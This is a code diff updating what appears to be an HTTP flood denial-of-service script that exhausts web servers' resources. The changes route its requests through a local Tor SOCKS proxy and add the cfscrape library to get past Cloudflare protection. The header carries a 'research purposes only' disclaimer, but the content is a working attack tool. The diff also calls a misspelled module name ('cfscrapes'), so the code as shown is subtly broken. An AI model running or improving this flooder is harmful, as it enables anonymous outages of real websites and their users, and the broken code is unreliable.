@@ -5,14 +5,15 @@
 # to their knees by exhausting the resource pool, its is meant for research purposes only
 # and any malicious usage of this tool is prohibited.
 #
-# author :  Barry Shteiman, MikeKamau, Maxim Muzafarov, Pr0xy671 , Version 2.1
+# author :  Barry Shteiman, MikeKamau, Maxim Muzafarov, Pr0xy671 , Version 2.2
 # ----------------------------------------------------------------------------------------------
 import sys, requests, socks, socket, threading;from requests.exceptions import HTTPError, ConnectionError
 from random import randint, choice; from re import search; from string import ascii_lowercase as alphabet
+import cfscrape
 
-#The following two lines connect to the local SOCKS5 proxy that's started on port 9050 when tor
+#The following two lines connect to the local SOCKS5 proxy that's started on port 9150 when tor
 #starts up.
-socks.set_default_proxy(socks.SOCKS5,"127.0.0.1", 9050)
+socks.set_default_proxy(socks.SOCKS5,"127.0.0.1", 9150)
 socket.socket = socks.socksocket
 
 #global params
@@ -23,6 +24,7 @@ headers_referers=[]
 request_counter=0
 flag=0
 safe=False
+scrape = cfscrapes.create_scraper()
 
 def inc_counter():
 	global request_counter
@@ -81,20 +83,8 @@ def httpcall(url):
 	useragent_list()
 	referer_list()
 	code=0
-	if url.count("?")>0:
-		param_joiner="&"
-	else:
-		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
-	request.add_header('User-Agent', random.choice(headers_useragents))
-	request.add_header('Cache-Control', 'no-cache')
-	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-	request.add_header('Keep-Alive', random.randint(110,120))
-	request.add_header('Connection', 'keep-alive')
-	request.add_header('Host',host)
 	try:
-		requests.get(
+		scrape.get(
             		url,
             		params={buildblock(): buildblock()},
             		headers={
@@ -113,7 +103,7 @@ def httpcall(url):
 			sys.exit()
 	else:
 		inc_counter()
-		requests.get(
+		scrape.get(
             		url,
         		params={buildblock(): buildblock()},
             		headers={
